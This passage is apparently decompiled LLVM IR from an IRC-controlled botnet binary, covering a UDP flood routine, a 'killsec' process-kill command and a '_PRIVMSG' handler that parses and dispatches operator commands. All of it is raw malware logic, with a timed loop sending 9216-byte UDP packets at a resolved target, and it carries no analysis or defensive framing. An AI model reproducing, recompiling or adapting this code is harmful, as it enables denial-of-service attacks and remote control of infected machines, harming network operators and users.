  %v1_100014b8 = add i32 %arg4, 4
  %v1_100014bc = inttoptr i32 %v1_100014b8 to i32*
  %v2_100014bc = load i32, i32* %v1_100014bc, align 4
  store i32 268440780, i32* @lr, align 4
  %v3_100014c8 = call i32 @host2ip(i32 %arg2, i32 %v2_100014bc, i32 %v1_100014b8)
  store i32 2, i32* %stack_var_-44, align 4
  %v3_100014e0 = load i32, i32* @global_var_1002c314.34, align 4
  %v2_100014ec = load i32, i32* %v1_100014bc, align 4
  %v6_10001508 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_10015af0.47 to i32), i32 %v3_100014e0, i32 %v2_100014ec, i32 268500992)
  %v2_100015b0 = add i32 %v2_10001484, %v1_10001420
  %v2_10001548 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_1000150c

dec_label_pc_1000150c:                            ; preds = %dec_label_pc_100015c4, %dec_label_pc_10001474
  %stack_var_-56.0 = phi i32 [ %tmp, %dec_label_pc_10001474 ], [ %v1_100015c8, %dec_label_pc_100015c4 ]
  store i32 268440848, i32* @lr, align 4
  %v0_1000150c = call i32 @random()
  store i32 268440876, i32* @lr, align 4
  %v3_10001528 = call i32 @socket(i32 2, i32 2, i32 17)
  %v1_10001538 = icmp slt i32 %v3_10001528, 0
  br i1 %v1_10001538, label %dec_label_pc_1000158c, label %dec_label_pc_10001540

dec_label_pc_10001540:                            ; preds = %dec_label_pc_1000150c
  store i32 1, i32* %stack_var_-48, align 4
  store i32 268440932, i32* @lr, align 4
  %v3_10001560 = call i32 @ioctl(i32 %v3_10001528, i32 -2147195266, i32 %v2_10001548)
  store i32 268440964, i32* @lr, align 4
  %v6_10001580 = call i32 @sendto(i32 %v3_10001528, i32 %v0_10001410, i32 9216, i32 0, i32 %v2_10001490, i32 16)
  store i32 268440972, i32* @lr, align 4
  %v1_10001588 = call i32 @close(i32 %v3_10001528)
  br label %dec_label_pc_1000158c

dec_label_pc_1000158c:                            ; preds = %dec_label_pc_1000150c, %dec_label_pc_10001540
  %tmp20 = icmp slt i32 %stack_var_-56.0, 50
  br i1 %tmp20, label %dec_label_pc_100015c4, label %dec_label_pc_10001598

dec_label_pc_10001598:                            ; preds = %dec_label_pc_1000158c
  store i32 268440992, i32* @lr, align 4
  %v1_1000159c = call i32 @__GI_time(i32 0)
  %v2_100015b4 = icmp ult i32 %v1_1000159c, %v2_100015b0
  br i1 %v2_100015b4, label %dec_label_pc_100015bc, label %dec_label_pc_100015d4

dec_label_pc_100015bc:                            ; preds = %dec_label_pc_10001598
  br label %dec_label_pc_100015c4

dec_label_pc_100015c4:                            ; preds = %dec_label_pc_1000158c, %dec_label_pc_100015bc
  %stack_var_-56.1 = phi i32 [ %stack_var_-56.0, %dec_label_pc_1000158c ], [ 0, %dec_label_pc_100015bc ]
  %v1_100015c8 = add i32 %stack_var_-56.1, 1
  br label %dec_label_pc_1000150c

dec_label_pc_100015d4:                            ; preds = %dec_label_pc_10001598
  %v3_100015d8 = load i32, i32* @global_var_1002c314.34, align 4
  %v2_100015e4 = load i32, i32* %v1_100014bc, align 4
  %v6_10001600 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_10015b10.49 to i32), i32 %v3_100015d8, i32 %v2_100015e4, i32 268500992)
  store i32 ptrtoint ([3 x i8]* @global_var_1000160c.50 to i32), i32* @lr, align 4
  %v1_10001608 = call i32 @close(i32 %v3_10001528)
  %v0_10001610 = call i32 @__GI_exit()
  br label %dec_label_pc_10001614

dec_label_pc_10001614:                            ; preds = %entry, %dec_label_pc_100015d4
  %v0_10001628 = phi i32 [ %v1_10001430, %entry ], [ %v0_10001610, %dec_label_pc_100015d4 ]
  ret i32 %v0_10001628

; uselistorder directives
  uselistorder i32* %stack_var_-48, { 0, 2, 1 }
  uselistorder i32 50, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @atol, { 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001614, { 1, 0 }
  uselistorder label %dec_label_pc_100015c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000158c, { 1, 0 }
  uselistorder label %dec_label_pc_10001474, { 1, 0 }
}

define i32 @killsec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10001654 = load i32, i32* bitcast ([5 x i8]** @global_var_1002c24c.52 to i32*), align 4
  store i32 %v3_10001654, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  %v3_10001660 = call i32 @__GI_strcasecmp(i32 %v3_10001654, i32 %arg2)
  %v3_10001668 = icmp eq i32 %v3_10001660, 0
  br i1 %v3_10001668, label %dec_label_pc_10001670, label %dec_label_pc_10001680

dec_label_pc_10001670:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1000167c.53 to i32), i32* @lr, align 4
  %v2_10001678 = call i32 @kill(i32 0, i32 9)
  br label %dec_label_pc_100016a0

dec_label_pc_10001680:                            ; preds = %entry
  %v3_10001684 = load i32, i32* @global_var_1002c314.34, align 4
  %v5_1000169c = load i32, i32* @r7, align 4
  %v6_1000169c = call i32 @Send(i32 %arg1, i32 ptrtoint ([25 x i8]* @global_var_10015b34.54 to i32), i32 %v3_10001684, i32 268500992, i32 %v5_1000169c)
  br label %dec_label_pc_100016a0

dec_label_pc_100016a0:                            ; preds = %dec_label_pc_10001670, %dec_label_pc_10001680
  %storemerge = phi i32 [ %v6_1000169c, %dec_label_pc_10001680 ], [ %v2_10001678, %dec_label_pc_10001670 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_100016a0, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-1144 = alloca i32, align 4
  %stack_var_-1076 = alloca i32, align 4
  %stack_var_-1152 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100016b8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100016b8, i32* %stack_var_-1152, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r3, align 4
  %v0_100016fc70 = call i32 @__GI_strlen()
  store i32 %v0_100016fc70, i32* %r3.global-to-local, align 4
  %v0_1000170471 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000170472 = icmp ult i32 %v0_1000170471, %v0_100016fc70
  br i1 %v2_1000170472, label %dec_label_pc_1000170c, label %dec_label_pc_1000172c

dec_label_pc_100016e8:                            ; preds = %dec_label_pc_1000170c
  %v1_100016ec = add i32 %storemerge875, 1
  store i32 %v1_100016ec, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r3, align 4
  %v0_100016fc = call i32 @__GI_strlen()
  store i32 %v0_100016fc, i32* %r3.global-to-local, align 4
  %v0_10001704 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001704 = icmp ult i32 %v0_10001704, %v0_100016fc
  br i1 %v2_10001704, label %dec_label_pc_1000170c, label %dec_label_pc_1000172c

dec_label_pc_1000170c:                            ; preds = %entry, %dec_label_pc_100016e8
  %storemerge875 = phi i32 [ %v1_100016ec, %dec_label_pc_100016e8 ], [ 0, %entry ]
  %v2_10001718 = add i32 %storemerge875, %arg3
  %v1_1000171c = inttoptr i32 %v2_10001718 to i8*
  %v2_1000171c = load i8, i8* %v1_1000171c, align 1
  %v3_10001724 = icmp eq i8 %v2_1000171c, 32
  br i1 %v3_10001724, label %dec_label_pc_1000172c, label %dec_label_pc_100016e8

dec_label_pc_1000172c:                            ; preds = %dec_label_pc_100016e8, %dec_label_pc_1000170c, %entry
  %storemerge8.lcssa = phi i32 [ 0, %entry ], [ %v1_100016ec, %dec_label_pc_100016e8 ], [ %storemerge875, %dec_label_pc_1000170c ]
  %v2_10001738 = add i32 %storemerge8.lcssa, %arg3
  %v3_10001740 = inttoptr i32 %v2_10001738 to i8*
  store i8 0, i8* %v3_10001740, align 1
  %v1_1000175c = add i32 %v2_10001738, 2
  %v5_10001760 = inttoptr i32 %v1_1000175c to i8*
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_1000178462 = call i32 @__GI_strlen()
  store i32 %v0_1000178462, i32* %r3.global-to-local, align 4
  %v0_1000178c63 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000178c64 = icmp ult i32 %v0_1000178c63, %v0_1000178462
  br i1 %v2_1000178c64, label %dec_label_pc_10001794, label %dec_label_pc_100017b4

dec_label_pc_10001770:                            ; preds = %dec_label_pc_10001794
  %v1_10001774 = add i32 %storemerge967, 1
  store i32 %v1_10001774, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_10001784 = call i32 @__GI_strlen()
  store i32 %v0_10001784, i32* %r3.global-to-local, align 4
  %v0_1000178c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000178c = icmp ult i32 %v0_1000178c, %v0_10001784
  br i1 %v2_1000178c, label %dec_label_pc_10001794, label %dec_label_pc_100017b4

dec_label_pc_10001794:                            ; preds = %dec_label_pc_1000172c, %dec_label_pc_10001770
  %storemerge967 = phi i32 [ %v1_10001774, %dec_label_pc_10001770 ], [ 0, %dec_label_pc_1000172c ]
  %v2_100017a0 = add i32 %storemerge967, %arg2
  %v1_100017a4 = inttoptr i32 %v2_100017a0 to i8*
  %v2_100017a4 = load i8, i8* %v1_100017a4, align 1
  %v3_100017ac = icmp eq i8 %v2_100017a4, 33
  br i1 %v3_100017ac, label %dec_label_pc_100017b4, label %dec_label_pc_10001770

dec_label_pc_100017b4:                            ; preds = %dec_label_pc_10001770, %dec_label_pc_10001794, %dec_label_pc_1000172c
  %storemerge9.lcssa = phi i32 [ 0, %dec_label_pc_1000172c ], [ %v1_10001774, %dec_label_pc_10001770 ], [ %storemerge967, %dec_label_pc_10001794 ]
  %v2_100017c0 = add i32 %storemerge9.lcssa, %arg2
  %v3_100017c8 = inttoptr i32 %v2_100017c0 to i8*
  store i8 0, i8* %v3_100017c8, align 1
  %v2_100017d0 = load i8, i8* %v5_10001760, align 1
  %v3_100017d8 = icmp eq i8 %v2_100017d0, 62
  br i1 %v3_100017d8, label %dec_label_pc_100017e0, label %dec_label_pc_10001c24

dec_label_pc_100017e0:                            ; preds = %dec_label_pc_100017b4
  %v3_100017e4 = load i32, i32* @global_var_1002c314.34, align 4
  store i32 %arg3, i32* @r3, align 4
  store i32 %v3_100017e4, i32* @r4, align 4
  %v2_100017f0 = call i32 @__GI_strcasecmp(i32 %arg3, i32 %v3_100017e4)
  store i32 %v2_100017f0, i32* %r3.global-to-local, align 4
  %v3_100017f8 = icmp eq i32 %v2_100017f0, 0
  br i1 %v3_100017f8, label %dec_label_pc_10001800, label %dec_label_pc_10001c24

dec_label_pc_10001800:                            ; preds = %dec_label_pc_100017e0
  %v2_10001800 = ptrtoint i32* %stack_var_-1076 to i32
  store i32 %v2_10001800, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10001818.55 to i32), i32* @lr, align 4
  %v3_10001814 = call i32 @__GI_memset(i32 %v2_10001800, i32 0, i32 1024)
  %v1_10001824 = add i32 %v2_10001738, 3
  %v5_10001828 = inttoptr i32 %v1_10001824 to i8*
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10001824, i32* @r3, align 4
  %v0_1000184c54 = call i32 @__GI_strlen()
  store i32 %v0_1000184c54, i32* %r3.global-to-local, align 4
  %v0_1000185455 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000185456 = icmp ult i32 %v0_1000185455, %v0_1000184c54
  br i1 %v2_1000185456, label %dec_label_pc_1000185c, label %dec_label_pc_1000187c

dec_label_pc_10001838:                            ; preds = %dec_label_pc_1000185c
  %v1_1000183c = add i32 %storemerge1059, 1
  store i32 %v1_1000183c, i32* %r29.global-to-local, align 4
  store i32 %v1_10001824, i32* @r3, align 4
  %v0_1000184c = call i32 @__GI_strlen()
  store i32 %v0_1000184c, i32* %r3.global-to-local, align 4
  %v0_10001854 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001854 = icmp ult i32 %v0_10001854, %v0_1000184c
  br i1 %v2_10001854, label %dec_label_pc_1000185c, label %dec_label_pc_1000187c

dec_label_pc_1000185c:                            ; preds = %dec_label_pc_10001800, %dec_label_pc_10001838
  %storemerge1059 = phi i32 [ %v1_1000183c, %dec_label_pc_10001838 ], [ 0, %dec_label_pc_10001800 ]
  %v2_10001868 = add i32 %storemerge1059, %v1_10001824
  %v1_1000186c = inttoptr i32 %v2_10001868 to i8*
  %v2_1000186c = load i8, i8* %v1_1000186c, align 1
  %v3_10001874 = icmp eq i8 %v2_1000186c, 32
  br i1 %v3_10001874, label %dec_label_pc_1000187c, label %dec_label_pc_10001838

dec_label_pc_1000187c:                            ; preds = %dec_label_pc_10001838, %dec_label_pc_1000185c, %dec_label_pc_10001800
  %storemerge10.lcssa = phi i32 [ 0, %dec_label_pc_10001800 ], [ %v1_1000183c, %dec_label_pc_10001838 ], [ %storemerge1059, %dec_label_pc_1000185c ]
  %v2_10001888 = add i32 %storemerge10.lcssa, %v1_10001824
  %v3_10001890 = inttoptr i32 %v2_10001888 to i8*
  store i8 0, i8* %v3_10001890, align 1
  %v3_1000189c = load i32, i32* @global_var_1002c2fc.56, align 4
  store i32 %v1_10001824, i32* %r3.global-to-local, align 4
  store i32 268441772, i32* @lr, align 4
  %v4_100018a8 = call i32 @strwildmatch(i8* %v5_10001828, i32 %v3_1000189c, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v4_100018a8, i32* %r3.global-to-local, align 4
  %v3_100018b0 = icmp eq i32 %v4_100018a8, 0
  br i1 %v3_100018b0, label %dec_label_pc_100018b8, label %dec_label_pc_10001c24

dec_label_pc_100018b8:                            ; preds = %dec_label_pc_1000187c
  %v1_100018c4 = add i32 %v2_10001888, 1
  store i32 %v1_100018c4, i32* @r3, align 4
  %v0_100018d0 = call i32 @__GI_strlen()
  store i32 %v0_100018d0, i32* %r3.global-to-local, align 4
  store i32 %v0_100018d0, i32* %stack_var_-1144, align 4
  %stack_var_-1136.040 = inttoptr i32 %v1_100018c4 to i8*
  %v2_1000194c42 = icmp sgt i32 %v0_100018d0, 0
  br i1 %v2_1000194c42, label %dec_label_pc_100018e8.lr.ph, label %dec_label_pc_10001998.preheader

dec_label_pc_100018e8.lr.ph:                      ; preds = %dec_label_pc_100018b8
  %v2_10001920 = ptrtoint i32* %stack_var_-1144 to i32
  %v2_10001924 = add i32 %v2_10001920, 68
  br label %dec_label_pc_100018e8

dec_label_pc_100018e8:                            ; preds = %dec_label_pc_100018e8.lr.ph, %dec_label_pc_10001910
  %stack_var_-1136.047 = phi i8* [ %stack_var_-1136.040, %dec_label_pc_100018e8.lr.ph ], [ %stack_var_-1136.0, %dec_label_pc_10001910 ]
  %storemerge1146 = phi i32 [ 0, %dec_label_pc_100018e8.lr.ph ], [ %v1_1000193c, %dec_label_pc_10001910 ]
  %stack_var_-1136.0.in45 = phi i32 [ %v1_100018c4, %dec_label_pc_100018e8.lr.ph ], [ %v1_10001930, %dec_label_pc_10001910 ]
  %v2_100018ec = load i8, i8* %stack_var_-1136.047, align 1
  %v3_100018f4 = icmp eq i8 %v2_100018ec, 32
  br i1 %v3_100018f4, label %dec_label_pc_10001998.preheader, label %dec_label_pc_100018fc

dec_label_pc_100018fc:                            ; preds = %dec_label_pc_100018e8
  %v2_10001900 = load i8, i8* %stack_var_-1136.047, align 1
  %v3_10001908 = icmp eq i8 %v2_10001900, 0
  br i1 %v3_10001908, label %dec_label_pc_10001998.preheader, label %dec_label_pc_10001910

dec_label_pc_10001910:                            ; preds = %dec_label_pc_100018fc
  %v2_10001918 = load i8, i8* %stack_var_-1136.047, align 1
  %v3_10001928 = add i32 %v2_10001924, %storemerge1146
  %v4_10001928 = inttoptr i32 %v3_10001928 to i8*
  store i8 %v2_10001918, i8* %v4_10001928, align 1
  %v1_10001930 = add i32 %stack_var_-1136.0.in45, 1
  %v1_1000193c = add i32 %storemerge1146, 1
  %stack_var_-1136.0 = inttoptr i32 %v1_10001930 to i8*
  %v3_10001948 = load i32, i32* %stack_var_-1144, align 4
  %v2_1000194c = icmp slt i32 %v1_1000193c, %v3_10001948
  br i1 %v2_1000194c, label %dec_label_pc_100018e8, label %dec_label_pc_10001998.preheader

dec_label_pc_10001998.preheader:                  ; preds = %dec_label_pc_10001910, %dec_label_pc_100018e8, %dec_label_pc_100018fc, %dec_label_pc_100018b8
  %stack_var_-1136.0.in.lcssa = phi i32 [ %v1_100018c4, %dec_label_pc_100018b8 ], [ %v1_10001930, %dec_label_pc_10001910 ], [ %stack_var_-1136.0.in45, %dec_label_pc_100018e8 ], [ %stack_var_-1136.0.in45, %dec_label_pc_100018fc ]
  %stack_var_-1136.0.lcssa = phi i8* [ %stack_var_-1136.040, %dec_label_pc_100018b8 ], [ %stack_var_-1136.0, %dec_label_pc_10001910 ], [ %stack_var_-1136.047, %dec_label_pc_100018e8 ], [ %stack_var_-1136.047, %dec_label_pc_100018fc ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %stack_var_-1136.0.in.lcssa, i32* @r3, align 4
  %v0_100019a032 = call i32 @__GI_strlen()
  store i32 %v0_100019a032, i32* %r3.global-to-local, align 4
  %v0_100019a833 = load i32, i32* %r29.global-to-local, align 4
  %v2_100019a834 = icmp ult i32 %v0_100019a833, %v0_100019a032
  br i1 %v2_100019a834, label %dec_label_pc_10001960, label %dec_label_pc_100019b0

dec_label_pc_10001960:                            ; preds = %dec_label_pc_10001998.preheader, %dec_label_pc_1000198c
  %storemerge1238 = phi i32 [ %v1_10001990, %dec_label_pc_1000198c ], [ 0, %dec_label_pc_10001998.preheader ]
  %stack_var_-1140.137 = phi i32 [ %stack_var_-1140.0, %dec_label_pc_1000198c ], [ 0, %dec_label_pc_10001998.preheader ]
  %v2_1000196c = add i32 %storemerge1238, %stack_var_-1136.0.in.lcssa
  %v1_10001970 = inttoptr i32 %v2_1000196c to i8*
  %v2_10001970 = load i8, i8* %v1_10001970, align 1
  %v3_10001978 = icmp eq i8 %v2_10001970, 32
  br i1 %v3_10001978, label %dec_label_pc_10001980, label %dec_label_pc_1000198c

dec_label_pc_10001980:                            ; preds = %dec_label_pc_10001960
  %v1_10001984 = add i32 %stack_var_-1140.137, 1
  br label %dec_label_pc_1000198c

dec_label_pc_1000198c:                            ; preds = %dec_label_pc_10001960, %dec_label_pc_10001980
  %stack_var_-1140.0 = phi i32 [ %v1_10001984, %dec_label_pc_10001980 ], [ %stack_var_-1140.137, %dec_label_pc_10001960 ]
  %v1_10001990 = add i32 %storemerge1238, 1
  store i32 %v1_10001990, i32* %r29.global-to-local, align 4
  store i32 %stack_var_-1136.0.in.lcssa, i32* @r3, align 4
  %v0_100019a0 = call i32 @__GI_strlen()
  store i32 %v0_100019a0, i32* %r3.global-to-local, align 4
  %v0_100019a8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100019a8 = icmp ult i32 %v0_100019a8, %v0_100019a0
  br i1 %v2_100019a8, label %dec_label_pc_10001960, label %dec_label_pc_100019b0

dec_label_pc_100019b0:                            ; preds = %dec_label_pc_1000198c, %dec_label_pc_10001998.preheader
  %stack_var_-1140.1.lcssa = phi i32 [ 0, %dec_label_pc_10001998.preheader ], [ %stack_var_-1140.0, %dec_label_pc_1000198c ]
  %v1_100019b4 = add i32 %stack_var_-1140.1.lcssa, 1
  %tmp102 = icmp slt i32 %v1_100019b4, 11
  br i1 %tmp102, label %dec_label_pc_100019d0, label %dec_label_pc_100019c8

dec_label_pc_100019c8:                            ; preds = %dec_label_pc_100019b0
  br label %dec_label_pc_100019d0

dec_label_pc_100019d0:                            ; preds = %dec_label_pc_100019b0, %dec_label_pc_100019c8
  %stack_var_-1140.2 = phi i32 [ %v1_100019b4, %dec_label_pc_100019b0 ], [ 10, %dec_label_pc_100019c8 ]
  %v1_100019dc = mul i32 %stack_var_-1140.2, 4
  %v2_100019e4 = ptrtoint i32* %stack_var_-1144 to i32
  %v2_100019e8 = add i32 %v2_100019e4, 24
  %v1_100019ec = add i32 %v2_100019e8, %v1_100019dc
  %v2_100019f8 = inttoptr i32 %v1_100019ec to i32*
  store i32 ptrtoint (i32* @global_var_10015b80.57 to i32), i32* %v2_100019f8, align 4
  store i32 1, i32* %stack_var_-1144, align 4
  %v2_10001b1c27 = load i8, i8* %stack_var_-1136.0.lcssa, align 1
  %v3_10001b2430 = icmp eq i8 %v2_10001b1c27, 0
  br i1 %v3_10001b2430, label %dec_label_pc_10001b2c, label %dec_label_pc_10001a08.lr.ph

dec_label_pc_10001a08.lr.ph:                      ; preds = %dec_label_pc_100019d0
  %v4_10001b1826 = ptrtoint i8* %stack_var_-1136.0.lcssa to i32
  %v2_10001a98 = add i32 %v2_100019e4, 20
  br label %dec_label_pc_10001a08

dec_label_pc_10001a08:                            ; preds = %dec_label_pc_10001a08.lr.ph, %dec_label_pc_10001a74
  %v3_10001a14 = phi i32 [ 1, %dec_label_pc_10001a08.lr.ph ], [ %v1_10001afc, %dec_label_pc_10001a74 ]
  %v4_10001b1831 = phi i32 [ %v4_10001b1826, %dec_label_pc_10001a08.lr.ph ], [ %v2_10001b10, %dec_label_pc_10001a74 ]
  %v1_10001a0c = add i32 %v4_10001b1831, 1
  %v2_10001a1c = icmp slt i32 %v3_10001a14, %stack_var_-1140.2
  br i1 %v2_10001a1c, label %dec_label_pc_10001a3c.preheader, label %dec_label_pc_10001b2c

dec_label_pc_10001a3c.preheader:                  ; preds = %dec_label_pc_10001a08
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10001a0c, i32* @r3, align 4
  %v0_10001a4419 = call i32 @__GI_strlen()
  store i32 %v0_10001a4419, i32* %r3.global-to-local, align 4
  %v0_10001a4c20 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001a4c21 = icmp ult i32 %v0_10001a4c20, %v0_10001a4419
  br i1 %v2_10001a4c21, label %dec_label_pc_10001a54, label %dec_label_pc_10001a74

dec_label_pc_10001a30:                            ; preds = %dec_label_pc_10001a54
  %v1_10001a34 = add i32 %storemerge1424, 1
  store i32 %v1_10001a34, i32* %r29.global-to-local, align 4
  store i32 %v1_10001a0c, i32* @r3, align 4
  %v0_10001a44 = call i32 @__GI_strlen()
  store i32 %v0_10001a44, i32* %r3.global-to-local, align 4
  %v0_10001a4c = load i32, i32* %r29.global-to-local, align 4
  %v2_10001a4c = icmp ult i32 %v0_10001a4c, %v0_10001a44
  br i1 %v2_10001a4c, label %dec_label_pc_10001a54, label %dec_label_pc_10001a74

dec_label_pc_10001a54:                            ; preds = %dec_label_pc_10001a3c.preheader, %dec_label_pc_10001a30
  %storemerge1424 = phi i32 [ %v1_10001a34, %dec_label_pc_10001a30 ], [ 0, %dec_label_pc_10001a3c.preheader ]
  %v2_10001a60 = add i32 %storemerge1424, %v1_10001a0c
  %v1_10001a64 = inttoptr i32 %v2_10001a60 to i8*
  %v2_10001a64 = load i8, i8* %v1_10001a64, align 1
  %v3_10001a6c = icmp eq i8 %v2_10001a64, 32
  br i1 %v3_10001a6c, label %dec_label_pc_10001a74, label %dec_label_pc_10001a30

dec_label_pc_10001a74:                            ; preds = %dec_label_pc_10001a30, %dec_label_pc_10001a54, %dec_label_pc_10001a3c.preheader
  %storemerge14.lcssa = phi i32 [ 0, %dec_label_pc_10001a3c.preheader ], [ %v1_10001a34, %dec_label_pc_10001a30 ], [ %storemerge1424, %dec_label_pc_10001a54 ]
  %v3_10001a74 = load i32, i32* %stack_var_-1144, align 4
  store i32 %v3_10001a74, i32* @r29, align 4
  %v1_10001a7c = add i32 %storemerge14.lcssa, 1
  store i32 %v1_10001a7c, i32* @r3, align 4
  store i32 268442248, i32* @lr, align 4
  %v0_10001a84 = call i32 @malloc()
  store i32 %v0_10001a84, i32* %r3.global-to-local, align 4
  %v0_10001a90 = load i32, i32* @r29, align 4
  %v1_10001a90 = mul i32 %v0_10001a90, 4
  %v1_10001a9c = add i32 %v1_10001a90, %v2_10001a98
  %v2_10001aa0 = inttoptr i32 %v1_10001a9c to i32*
  store i32 %v0_10001a84, i32* %v2_10001aa0, align 4
  %v3_10001aa4 = load i32, i32* %stack_var_-1144, align 4
  %v1_10001aa8 = mul i32 %v3_10001aa4, 4
  %v1_10001ab4 = add i32 %v1_10001aa8, %v2_10001a98
  %v1_10001ab8 = inttoptr i32 %v1_10001ab4 to i32*
  %v2_10001ab8 = load i32, i32* %v1_10001ab8, align 4
  store i32 %v2_10001ab8, i32* %r3.global-to-local, align 4
  store i32 %v1_10001a0c, i32* @r4, align 4
  store i32 268442320, i32* @lr, align 4
  %v3_10001acc = call i32 @strncpy(i32 %v2_10001ab8, i32 %v1_10001a0c, i32 %storemerge14.lcssa)
  store i32 %v3_10001acc, i32* %r3.global-to-local, align 4
  %v3_10001ad0 = load i32, i32* %stack_var_-1144, align 4
  %v1_10001ad4 = mul i32 %v3_10001ad0, 4
  %v1_10001ae0 = add i32 %v1_10001ad4, %v2_10001a98
  %v1_10001ae4 = inttoptr i32 %v1_10001ae0 to i32*
  %v2_10001ae4 = load i32, i32* %v1_10001ae4, align 4
  %v2_10001aec = add i32 %v2_10001ae4, %storemerge14.lcssa
  %v3_10001af4 = inttoptr i32 %v2_10001aec to i8*
  store i8 0, i8* %v3_10001af4, align 1
  %v3_10001af8 = load i32, i32* %stack_var_-1144, align 4
  %v1_10001afc = add i32 %v3_10001af8, 1
  store i32 %v1_10001afc, i32* %stack_var_-1144, align 4
  %v2_10001b10 = add i32 %storemerge14.lcssa, %v1_10001a0c
  %v5_10001b14 = inttoptr i32 %v2_10001b10 to i8*
  %v2_10001b1c = load i8, i8* %v5_10001b14, align 1
  %v3_10001b24 = icmp eq i8 %v2_10001b1c, 0
  br i1 %v3_10001b24, label %dec_label_pc_10001b2c, label %dec_label_pc_10001a08

dec_label_pc_10001b2c:                            ; preds = %dec_label_pc_10001a74, %dec_label_pc_10001a08, %dec_label_pc_100019d0
  store i32 0, i32* %stack_var_-1144, align 4
  %v2_10001c18 = load i32, i32* bitcast ([5 x i8]** @global_var_10027a0c.59 to i32*), align 4
  %v3_10001c1c = icmp eq i32 %v2_10001c18, 0
  br i1 %v3_10001c1c, label %dec_label_pc_10001c24, label %dec_label_pc_10001b38

dec_label_pc_10001b38:                            ; preds = %dec_label_pc_10001b2c
  store i32 %v2_10001c18, i32* @r3, align 4
  store i32 %v2_10001800, i32* @r4, align 4
  %v2_10001b5c = call i32 @__GI_strcasecmp(i32 %v2_10001c18, i32 %v2_10001800)
  store i32 %v2_10001b5c, i32* %r3.global-to-local, align 4
  %v3_10001b6c = load i32, i32* %stack_var_-1144, align 4
  %v1_10001b78 = mul i32 %v3_10001b6c, 8
  %v1_10001b80 = add i32 %v1_10001b78, add (i32 ptrtoint ([5 x i8]** @global_var_10027a0c.59 to i32), i32 4)
  %v1_10001b84 = inttoptr i32 %v1_10001b80 to i32*
  %v2_10001b84 = load i32, i32* %v1_10001b84, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_10001b84)
  %v2_10001bec15 = icmp sgt i32 %stack_var_-1140.2, 1
  br i1 %v2_10001bec15, label %dec_label_pc_10001bb8.lr.ph, label %dec_label_pc_10001c24

dec_label_pc_10001bb8.lr.ph:                      ; preds = %dec_label_pc_10001b38
  %v2_10001bc4 = add i32 %v2_100019e4, 20
  br label %dec_label_pc_10001bb8

dec_label_pc_10001bb8:                            ; preds = %dec_label_pc_10001bb8.lr.ph, %dec_label_pc_10001bb8
  %storemerge1318 = phi i32 [ 1, %dec_label_pc_10001bb8.lr.ph ], [ %v1_10001bdc, %dec_label_pc_10001bb8 ]
  %v1_10001bbc = mul i32 %storemerge1318, 4
  %v1_10001bc8 = add i32 %v2_10001bc4, %v1_10001bbc
  %v1_10001bcc = inttoptr i32 %v1_10001bc8 to i32*
  %v2_10001bcc = load i32, i32* %v1_10001bcc, align 4
  store i32 %v2_10001bcc, i32* @r3, align 4
  store i32 268442584, i32* @lr, align 4
  %v0_10001bd4 = call i32 @free()
  store i32 %v0_10001bd4, i32* %r3.global-to-local, align 4
  %v1_10001bdc = add nuw nsw i32 %storemerge1318, 1
  %v2_10001bec = icmp slt i32 %v1_10001bdc, %stack_var_-1140.2
  br i1 %v2_10001bec, label %dec_label_pc_10001bb8, label %dec_label_pc_10001c24

dec_label_pc_10001c24:                            ; preds = %dec_label_pc_10001bb8, %dec_label_pc_10001b38, %dec_label_pc_10001b2c, %dec_label_pc_1000187c, %dec_label_pc_100017e0, %dec_label_pc_100017b4
  %v2_10001c24 = load i32, i32* %stack_var_-1152, align 4
  %v1_10001c30 = add i32 %v2_10001c24, -12
  %v2_10001c30 = inttoptr i32 %v1_10001c30 to i32*
  %v3_10001c30 = load i32, i32* %v2_10001c30, align 4
  store i32 %v3_10001c30, i32* %r29.global-to-local, align 4
  %v0_10001c3c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10001c3c

; uselistorder directives
  uselistorder i32 %storemerge1318, { 1, 0 }
  uselistorder i32 %v2_10001c18, { 1, 0, 2 }
  uselistorder i32 %v2_10001b10, { 1, 0 }
  uselistorder i32 %v1_10001afc, { 1, 0 }
  uselistorder i32 %storemerge14.lcssa, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10001a0c, { 0, 3, 4, 1, 5, 2 }
  uselistorder i32 %v2_100019e4, { 2, 1, 0 }
